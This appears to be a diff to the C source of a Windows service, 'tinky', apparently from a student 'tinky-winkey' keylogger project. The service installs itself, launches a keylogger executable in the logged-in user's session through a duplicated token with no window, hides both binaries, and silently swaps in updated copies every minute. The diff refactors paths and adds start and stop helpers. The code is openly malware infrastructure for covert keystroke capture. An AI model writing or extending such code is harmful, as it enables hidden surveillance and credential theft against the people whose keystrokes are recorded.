@@ -12,6 +12,10 @@
 #define _WIN32_WINNT_WIN10_RS5 0x0A00
 #define NTDDI_WIN10_CU 0x0A000000
 
+#define TINKY_EXE "Z:\\tinky-winkey\\tinky\\tinky.exe"
+#define NEW_TINKY_EXE "Z:\\tinky-winkey\\tinky\\new_tinky.exe"
+#define WINKY_EXE "Z:\\tinky-winkey\\winkey\\winkey.exe"
+
 SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE hStatus;
 HANDLE hKeyloggerProcess = NULL;
@@ -28,7 +32,7 @@ int InstallService(void)
         hSCManager, SERVICE_NAME, SERVICE_NAME,
         SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
         SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
-        "Z:\\tinky-winkey\\tinky\\srcs\\tinky.exe start",
+        TINKY_EXE" start",
         NULL, NULL, NULL, NULL, NULL
     );
     if (!hService)
@@ -87,10 +91,11 @@ void WINAPI ControlHandler(DWORD request)
     switch (request)
     {
         case SERVICE_CONTROL_STOP:
+            ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
+            StopKeylogger();
             ServiceStatus.dwWin32ExitCode = 0;
             ServiceStatus.dwCurrentState = SERVICE_STOPPED;
             SetServiceStatus(hStatus, &ServiceStatus);
-            StopKeylogger();
             return;
         default:
             break;
@@ -98,15 +103,20 @@ void WINAPI ControlHandler(DWORD request)
     SetServiceStatus(hStatus, &ServiceStatus);
 }
 
-DWORD FindProcessID(const char* processName) {
+DWORD FindProcessID(const char* processName)
+{
     DWORD processID = 0;
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap != INVALID_HANDLE_VALUE) {
+    if (hSnap != INVALID_HANDLE_VALUE)
+    {
         PROCESSENTRY32 pe;
         pe.dwSize = sizeof(PROCESSENTRY32);
-        if (Process32First(hSnap, &pe)) {
-            do {
-                if (strcmp(pe.szExeFile, processName) == 0) {
+        if (Process32First(hSnap, &pe))
+        {
+            do
+            {
+                if (strcmp(pe.szExeFile, processName) == 0)
+                {
                     processID = pe.th32ProcessID;
                     break;
                 }
@@ -152,7 +162,7 @@ void StartKeylogger(void)
 
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
-    if (!CreateProcessAsUser(dupTokenHandle, NULL, "Z:\\tinky-winkey\\winkey\\srcs\\winkey.exe", NULL, NULL, FALSE,
+    if (!CreateProcessAsUser(dupTokenHandle, NULL, WINKY_EXE, NULL, NULL, FALSE,
                              CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
     {
         printf("CreateProcessAsUser failed: %lu\n", GetLastError());
@@ -182,10 +192,10 @@ DWORD WINAPI CheckForUpdates(LPVOID lpParam)
     (void)lpParam;
     while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
     {
-        if (UpdateAvailable("Z:\\tinky-winkey\\tinky\\srcs\\new_tinky.exe"))
+        if (UpdateAvailable(NEW_TINKY_EXE))
         {
             StopKeylogger();
-            MoveFile("Z:\\tinky-winkey\\tinky\\srcs\\new_tinky.exe", "Z:\\tinky-winkey\\tinky\\srcs\\tinky.exe");
+            MoveFile(NEW_TINKY_EXE, TINKY_EXE);
             StartKeylogger();
         }
         Sleep(60000);
@@ -195,21 +205,27 @@ DWORD WINAPI CheckForUpdates(LPVOID lpParam)
 
 void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 {
-    (void)argc;
-    (void)argv;
     hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ControlHandler);
-    if (!hStatus) return;
+    if (!hStatus)
+    {
+        return;
+    }
 
-    ServiceStatus.dwServiceType = SERVICE_WIN32;
+    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
     ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
-    SetServiceStatus(hStatus, &ServiceStatus);
-
     ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
-    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+    ServiceStatus.dwWin32ExitCode = 0;
+    ServiceStatus.dwServiceSpecificExitCode = 0;
+    ServiceStatus.dwCheckPoint = 0;
+    ServiceStatus.dwWaitHint = 3000;
     SetServiceStatus(hStatus, &ServiceStatus);
 
-    StartKeylogger();
-    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CheckForUpdates, NULL, 0, NULL);
+    Sleep(2000);
+
+    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
+    ServiceStatus.dwCheckPoint = 0;
+    ServiceStatus.dwWaitHint = 0;
+    SetServiceStatus(hStatus, &ServiceStatus);
 
     while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
     {
@@ -217,10 +233,62 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     }
 }
 
+
 void HideFiles(void)
 {
-    SetFileAttributes("Z:\\tinky-winkey\\tinky\\srcs\\tinky.exe", FILE_ATTRIBUTE_HIDDEN);
-    SetFileAttributes("Z:\\tinky-winkey\\winkey\\srcs\\winkey.exe", FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes(TINKY_EXE, FILE_ATTRIBUTE_HIDDEN);
+    SetFileAttributes(WINKY_EXE, FILE_ATTRIBUTE_HIDDEN);
+}
+
+int StartServiceProgrammatically(void)
+{
+    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (!hSCManager)
+    {
+        printf("OpenSCManager failed: %lu\n", GetLastError());
+        return 1;
+    }
+
+    SC_HANDLE hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_START);
+    if (!hService)
+    {
+        printf("OpenService failed: %lu\n", GetLastError());
+        CloseServiceHandle(hSCManager);
+        return 1;
+    }
+
+    if (!StartService(hService, 0, NULL))
+    {
+        DWORD err = GetLastError();
+        if (err == ERROR_SERVICE_ALREADY_RUNNING)
+        {
+            printf("Service is already running.\n");
+        }
+        else
+        {
+            printf("StartService failed: %lu\n", err);
+        }
+    }
+    else
+    {
+        printf("Service started successfully.\n");
+    }
+
+    CloseServiceHandle(hService);
+    CloseServiceHandle(hSCManager);
+    return 0;
+}
+
+void stopService(void)
+{
+    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    SC_HANDLE hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_STOP);
+    if (hService)
+    {
+        ControlService(hService, SERVICE_CONTROL_STOP, &ServiceStatus);
+        CloseServiceHandle(hService);
+    }
+    CloseServiceHandle(hSCManager);
 }
 
 int main(int argc, char* argv[])
@@ -235,28 +303,26 @@ int main(int argc, char* argv[])
         }
         else if (strcmp(argv[1], "delete") == 0)
         {
+            stopService();
             return UninstallService();
         }
         else if (strcmp(argv[1], "start") == 0)
         {
+            StartServiceProgrammatically();
             SERVICE_TABLE_ENTRY ServiceTable[] = {{SERVICE_NAME, ServiceMain}, {NULL, NULL}};
             StartServiceCtrlDispatcher(ServiceTable);
         }
         else if (strcmp(argv[1], "stop") == 0)
         {
-            SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-            SC_HANDLE hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_STOP);
-            if (hService)
-            {
-                ControlService(hService, SERVICE_CONTROL_STOP, &ServiceStatus);
-                CloseServiceHandle(hService);
-            }
-            CloseServiceHandle(hSCManager);
+            stopService();
         }
     }
     else
     {
-        printf("Usage: svc.exe [install | start | stop | delete]\n");
+        SERVICE_TABLE_ENTRY ServiceTable[] = {{SERVICE_NAME, ServiceMain}, {NULL, NULL}};
+        if (!StartServiceCtrlDispatcher(ServiceTable)) {
+            printf("StartServiceCtrlDispatcher failed: %lu\n", GetLastError());
+        }
     }
     return 0;
 }
